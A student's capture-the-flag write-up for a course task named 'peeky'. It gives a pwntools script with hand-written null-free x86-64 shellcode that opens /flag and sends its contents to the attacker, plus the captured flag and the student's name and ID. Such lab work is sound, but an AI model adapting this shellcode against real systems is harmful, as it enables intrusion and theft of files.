# Player
- Tim Niklas Gruel 1080 2021 2831
- username: realy0sh1

# Writeup: "peeky"
- story: same as peek, but without Null bytes
- the folling script automatically exploits it:
```python
#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
conn = pwn.remote('tasks.ws24.softsec.rub.de', 32872)

'''
fd_flag = open("/flag", O_RDONLY)
sendfile(stdout, fd_flag, 0, 1024)
return
'''
''' this is what i modified, sothat no zero bytes:
mov rbx, 0x00000067616c662f; # fd_flag = open("/flag", O_RDONLY)
push rbx;
mov rax, 2;
mov rdi, rsp;
mov rsi, 0;
syscall;
                
mov rdi, 1; # sendfile(stdout, fd_flag, 0, 1024)
mov rsi, rax;
mov rdx, 0;
mov r10, 1000;
mov rax, 40;
syscall;
                            
ret;
'''
# same as peek, but replaced zero byte with xor, mov, ...
shellcode = pwn.asm('''
    push rbx;
    
    ;#mov rbx, 0x00000067616c662f; # fd_flag = open("/flag", O_RDONLY)
    xor rbx, rbx
    mov bl, 0x67;
    shl rbx, 32;
    add rbx, 0x616c662f;
    push rbx;
    mov rdi, rsp;
    xor rax, rax;
    mov al, 2;   
    xor rsi, rsi;
    syscall;          
     
    xor rdi, rdi; # sendfile(stdout, fd_flag, 0, 1024)
    inc rdi;
    mov rsi, rax;
    xor rdx, rdx;
    xor rax, rax;              
    mov ax, 1000;
    mov r10, rax;
    xor rax, rax;
    mov al, 40;              
    syscall;

    pop rbx;                    
    ret;    
''')

print(f'shellcode: {shellcode.hex()}')
conn.recvuntil(b'please enter your (hex-encoded) shellcode, at most 4096 bytes:')
conn.sendline(shellcode.hex().encode())
print(f"flag: {conn.recvuntil(b'}')}")
```
- flag:
```
softsec{raSFVyWHIX-3e_x8KCukxsscB9bbvt6wIBJe9s6AJeUd4WY7eLQt8_RligwglC-d}
```